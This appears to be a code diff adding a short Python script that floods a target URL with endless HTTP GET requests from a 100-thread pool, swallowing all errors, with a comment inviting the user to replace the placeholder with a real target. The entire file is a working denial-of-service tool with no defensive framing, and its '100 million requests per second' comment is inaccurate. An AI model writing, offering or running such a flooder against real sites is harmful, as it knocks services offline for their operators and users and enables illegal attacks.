@@ -1,0 +1,26 @@
+import requests
+from multiprocessing.dummy import Pool as ThreadPool
+
+target_url = "https://example.com"  # Replace with your target URL
+num_requests = 100000000  # 100 million requests per second
+
+def send_request(_):
+    while True:
+        try:
+            response = requests.get(target_url)
+            # Uncomment the line below if you want to print the response content
+            # print(response.content)
+        except Exception as e:
+            # Uncomment the line below if you want to print the exception
+            # print(e)
+            pass
+
+# Create a pool of threads to send requests
+pool = ThreadPool(100)  # Adjust the pool size based on your system capabilities
+
+# Map the function to the pool and repeat it for the desired number of requests
+pool.map(send_request, range(num_requests))
+
+# Close the pool
+pool.close()
+pool.join()
